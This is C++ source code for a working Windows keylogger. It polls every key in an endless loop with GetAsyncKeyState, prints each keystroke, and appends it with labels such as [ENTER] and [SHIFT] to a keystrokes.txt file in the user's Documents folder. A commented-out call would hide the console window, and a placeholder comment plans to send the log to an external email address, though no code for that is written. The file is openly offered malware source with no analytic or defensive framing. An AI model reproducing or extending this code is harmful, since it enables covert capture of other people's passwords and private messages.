#include <iostream>
#include <fstream>
#include <Windows.h>
#include <ShlObj.h>


/*
* - Check if a folder exists
* - param path: the folder's path
* - return: true ,if it exists
*               false ,otherwise
*/
bool folderExists(PWSTR path);

/*
* - Get the folder path where we save the keystrokes
* - return: folder path ,if it exist or it was created
			null ,otherwise
* - rtype: PWSTR
*/
PWSTR getFolderPath();

/*
* - save a character in the file
*/
int save(int key, std::wstring filePath);


int main()
{
	// FreeConsole();

	PWSTR folderPath = getFolderPath();
	if (folderPath == NULL) {
		return 1;
	}

	// Create a text file in the folder if it doesn't exist
	std::wstring filePath = folderPath + std::wstring(L"\\keystrokes.txt");

	while (true) {
		Sleep(30);

		// Sense keystrokes
		for (int i = 8; i < 128; i++) {
			int keyState = GetAsyncKeyState(i);

			if (keyState == -32767) {
				std::cout << (char)i;
				// Save the strokes into a text file
				save(i, filePath);
			}

			// Send text to an external email
		}
	}

	CoTaskMemFree(folderPath);


	return 0;
}

bool folderExists(PWSTR path) {
	DWORD attributes = GetFileAttributes(path);

	return (attributes != INVALID_FILE_ATTRIBUTES &&
		(attributes & FILE_ATTRIBUTE_DIRECTORY));
}

PWSTR getFolderPath() {
	PWSTR folderPath;

	// Get the folder's path
	if (SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &folderPath) == S_OK) {
		// If the folder does not exist, try to create it
		if (folderExists(folderPath) == false) {
			if (!CreateDirectory(folderPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
				CoTaskMemFree(folderPath);
				return NULL;
			}
		}
	}
	else {
		CoTaskMemFree(folderPath);
		return NULL;
	}

	return folderPath;
}

int save(int key, std::wstring filePath)
{
	std::wofstream fout(filePath, std::ios::app);

	if (fout.is_open()) {

		switch (key)
		{
		case VK_LBUTTON: fout << "[LBUTTON]";
			break;
		case VK_RBUTTON: fout << "[RBUTTON]";
			break;
		case VK_BACK: fout << "[BACKSPACE]";
			break;
		case VK_TAB: fout << "[TAB]";
			break;
		case VK_CLEAR: fout << "[CLEAR]";
			break;
		case VK_RETURN: fout << "[ENTER]\n";
			break;
		case VK_SHIFT: fout << "[SHIFT]";
			break;
		case VK_CONTROL: fout << "[CTRL]";
			break;
		case VK_MENU: fout << "[ALT]";
			break;
		case VK_CAPITAL: fout << "[CAPSLOCK]";
			break;
		case VK_ESCAPE: fout << "[ESC]";
			break;
		case VK_SPACE: fout << "[SPACEBAR] ";
			break;
		case VK_UP: fout << "[UP_ARROW]";
			break;
		case VK_RIGHT: fout << "[RIGHT_ARROW]";
			break;
		case VK_DOWN: fout << "[DOWN_ARROW]";
			break;
		case VK_LEFT: fout << "[LEFT_ARROW]";
			break;
		case VK_DELETE: fout << "[DEL]";
			break;
		default:
			fout << (char)key;
			break;
		}
		
		fout.flush();
	}

	fout.close();


	return 0;
}
